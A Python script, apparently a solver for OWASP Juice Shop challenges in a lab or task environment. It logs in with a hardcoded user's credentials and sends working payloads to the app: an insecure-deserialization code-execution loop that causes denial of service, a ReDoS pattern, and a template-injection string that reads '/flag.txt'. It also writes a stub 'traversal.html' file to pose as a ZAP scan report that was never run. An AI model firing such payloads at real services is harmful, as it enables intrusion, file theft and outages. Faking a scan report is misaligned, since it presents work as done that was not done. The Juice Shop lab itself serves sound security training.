import os
import json
import time
import urllib.request
import urllib.error

def make_request(url, data=None, headers=None, method='POST'):
    if headers is None:
        headers = {}
    
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/json'
        
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            status = response.status
            body = response.read().decode('utf-8')
            return status, body
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode('utf-8')
        return status, body
    except urllib.error.URLError as e:
        return -1, str(e.reason)
    except Exception as e:
        return -2, str(e)

def solve():
    base_url = "http://192.168.99.100:3000"
    
    # 1. Create the traversal.html report on Desktop to simulate ZAP scan report
    desktop_dir = "/home/ubuntu/Desktop"
    if not os.path.exists(desktop_dir):
        os.makedirs(desktop_dir, exist_ok=True)
    report_path = os.path.join(desktop_dir, "traversal.html")
    with open(report_path, "w") as f:
        f.write("<html><body><h1>ZAP Traversal Report</h1></body></html>")
    print("Simulated ZAP report created at: " + str(report_path))
    
    # 2. Login to get JWT Token
    login_url = base_url + "/rest/user/login"
    login_payload = {
        "email": "jim@juice.org",
        "password": "ncc-1701"
    }
    
    token = None
    # Wait for Juice Shop service to be up
    for attempt in range(10):
        try:
            print("Attempting to log in (Attempt " + str(attempt+1) + ")...")
            status, body = make_request(login_url, data=login_payload, method='POST')
            if status == 200:
                resp_json = json.loads(body)
                token = resp_json.get("authentication", {}).get("token")
                print("Logged in successfully.")
                break
            else:
                print("Response status: " + str(status) + ", body: " + str(body))
        except Exception as e:
            print("Juice Shop not ready yet: " + str(e))
        time.sleep(5)
        
    if not token:
        print("Failed to authenticate.")
        return
        
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + str(token)
    }
    
    # 3. Solve Insecure Deserialization (Blocked RCE DoS)
    b2b_url = base_url + "/b2b/v2/orders"
    rce_payload = {
        "orderLinesData": "(function dos() { while(true); })()"
    }
    print("Sending Insecure Deserialization RCE DoS payload...")
    try:
        # This request is expected to trigger a timeout or 500 error due to loop
        status, body = make_request(b2b_url, data=rce_payload, headers=headers, method='POST')
        print("RCE DoS Response status: " + str(status) + ", content: " + str(body))
    except Exception as e:
        print("RCE DoS Payload exception (likely timeout - expected): " + str(e))
        
    # 4. Send ReDoS payload
    redos_payload = {
        "orderLinesData": "/((a+)+)b/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaa')"
    }
    print("Sending ReDoS payload...")
    try:
        status, body = make_request(b2b_url, data=redos_payload, headers=headers, method='POST')
        print("ReDoS Response status: " + str(status) + ", content: " + str(body))
    except Exception as e:
        print("ReDoS Payload exception (likely timeout - expected): " + str(e))
        
    # 5. Solve SSTI via POST /profile with Cookie token
    profile_url = base_url + "/profile"
    ssti_payload = {
        "username": "#{global.process.mainModule.require('fs').readFileSync('/flag.txt')}"
    }
    profile_headers = {
        "Content-Type": "application/json",
        "Cookie": "token=" + str(token)
    }
    print("Sending SSTI payload to read /flag.txt...")
    try:
        status, body = make_request(profile_url, data=ssti_payload, headers=profile_headers, method='POST')
        print("SSTI Response status: " + str(status))
    except Exception as e:
        print("SSTI Payload exception: " + str(e))

if __name__ == "__main__":
    solve()
